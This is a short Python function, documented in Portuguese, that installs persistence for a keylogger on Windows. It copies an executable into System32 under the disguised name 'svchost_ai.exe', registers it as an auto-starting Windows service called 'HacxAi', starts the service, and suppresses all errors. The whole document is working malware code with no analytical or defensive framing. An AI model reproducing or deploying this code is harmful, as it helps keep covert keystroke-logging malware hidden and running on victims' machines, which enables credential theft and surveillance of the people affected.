import shutil, subprocess, os

def setup_persistence(exe_path):
    """
    Configura persistência invisível do keylogger no Windows.
    """
    target_path = "C:\\Windows\\System32\\svchost_ai.exe"
    try:
        shutil.copy(exe_path, target_path)
        subprocess.run(f'sc create HacxAi binPath= "{target_path}" start= auto', shell=True)
        subprocess.run(f'sc start HacxAi', shell=True)
    except:
        pass